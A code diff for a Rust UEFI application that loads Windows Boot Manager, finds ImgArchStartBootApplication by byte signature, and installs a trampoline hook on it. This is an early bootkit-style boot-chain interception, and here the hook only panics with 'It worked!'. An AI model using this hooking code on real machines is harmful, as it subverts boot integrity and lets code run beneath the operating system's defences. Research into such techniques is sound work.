@@ -5,23 +5,31 @@ extern crate alloc;
 
 mod hook;
 
+use core::ffi::c_void;
 use core::u8;
 
 use alloc::borrow::ToOwned;
 use alloc::boxed::Box;
+use alloc::slice;
 use alloc::vec::Vec;
 
+use hook::{trampoline_hook, ImgArchStartBootApplication};
 use uefi::prelude::*;
 use uefi::proto::device_path::{
     build::{media::FilePath, DevicePathBuilder},
     DevicePath,
 };
+use uefi::proto::loaded_image::LoadedImage;
 use uefi::proto::media::file::{File, FileAttribute, FileMode};
 use uefi::proto::media::fs::SimpleFileSystem;
 use uefi::table::boot::{HandleBuffer, LoadImageSource, SearchType};
 use uefi::{CStr16, Identify};
 
 const WINDOWS_BOOTMGR_PATH: &CStr16 = cstr16!("\\efi\\microsoft\\boot\\bootmgfw.efi");
+const IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE: &str = "48 8B C4 48 89 58 20 44 89 40 18 48 89 50 10 48 89 48 08 55 56 57 41 54 41 55 41 56 41 57 48 8D 68 A9";
+
+static mut IMG_ARCH_START_BOOT_APPLICATION: Option<ImgArchStartBootApplication> = None;
+static mut IMG_ARCH_START_BOOT_ORIGINAL: [u8; hook::JMP_SIZE] = [0; hook::JMP_SIZE];
 
 #[entry]
 fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status {
@@ -31,7 +39,7 @@ fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status
     let bootmgr_device_path = windows_bootmgr_device_path(boot_services)
         .expect("Failed to find Windows Boot Manager. Is Windows installed?");
     log::info!("[+] Found! Loading Boot Manager into memory");
-    let bootmgr_image = boot_services
+    let bootmgr_handle = boot_services
         .load_image(
             image_handle,
             LoadImageSource::FromDevicePath {
@@ -40,12 +48,43 @@ fn efi_main(image_handle: Handle, mut system_table: SystemTable<Boot>) -> Status
             },
         )
         .unwrap();
+    setup_hooks(&bootmgr_handle, boot_services);
     log::info!("[+] Starting Windows Boot Manager");
-    system_table.boot_services().stall(2_000_000);
+    system_table.boot_services().stall(5_000_000);
     boot_services
-        .start_image(bootmgr_image)
+        .start_image(bootmgr_handle)
         .expect("Failed to start Windows Boot Manager");
     Status::SUCCESS
+}
+
+fn setup_hooks(bootmgr_handle: &Handle, boot_services: &BootServices) {
+    let bootmgr_image = boot_services
+        .open_protocol_exclusive::<LoadedImage>(*bootmgr_handle)
+        .unwrap();
+    let (image_base, image_size) = bootmgr_image.info();
+    let bootmgr_data = unsafe { slice::from_raw_parts(image_base as *const _, image_size as _) };
+    let offset = find_pattern(IMG_ARCH_START_BOOT_APPLICATION_SIGNATURE, bootmgr_data)
+        .expect("Unable to match ImgArchStartBootApplication signature");
+    unsafe {
+        IMG_ARCH_START_BOOT_APPLICATION =
+            Some(core::mem::transmute::<_, ImgArchStartBootApplication>(
+                image_base.offset(offset as isize) as *mut c_void,
+            ));
+        IMG_ARCH_START_BOOT_ORIGINAL = trampoline_hook(
+            IMG_ARCH_START_BOOT_APPLICATION.unwrap() as *mut _,
+            img_arch_start_boot_application_hook as *const ImgArchStartBootApplication,
+        )
+    };
+}
+
+fn img_arch_start_boot_application_hook(
+    _app_entry: *mut c_void,
+    _image_base: *mut c_void,
+    _image_size: u32,
+    _boot_option: u8,
+    _return_arguments: *mut c_void,
+) {
+    panic!("It worked!");
 }
 
 fn windows_bootmgr_device_path(boot_services: &BootServices) -> Option<Box<DevicePath>> {
